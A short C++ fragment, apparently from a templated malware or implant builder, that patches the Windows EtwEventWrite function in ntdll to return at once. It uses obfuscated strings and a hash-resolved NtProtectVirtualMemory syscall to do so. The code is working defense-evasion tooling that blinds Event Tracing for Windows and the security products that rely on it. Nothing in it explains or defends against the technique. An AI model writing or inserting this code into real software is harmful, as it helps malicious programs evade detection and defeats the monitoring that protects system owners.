// Patch EtwEventWrite to ret
static void bypass_etw_patch_etwwrite() {
    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
    if (!hNtdll) return;

    void* addr = reinterpret_cast<void*>(GetProcAddress(hNtdll, obf("EtwEventWrite")));
    if (!addr) return;

    uint8_t patch = 0xC3; // ret
    PVOID base = addr;
    SIZE_T size = 1;
    ULONG old_prot;

    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
    if (NtPVM) {
        NtPVM(GetCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &old_prot);
        *reinterpret_cast<uint8_t*>(addr) = patch;
        NtPVM(GetCurrentProcess(), &base, &size, old_prot, &old_prot);
    }
}
{{#ENDIF}}

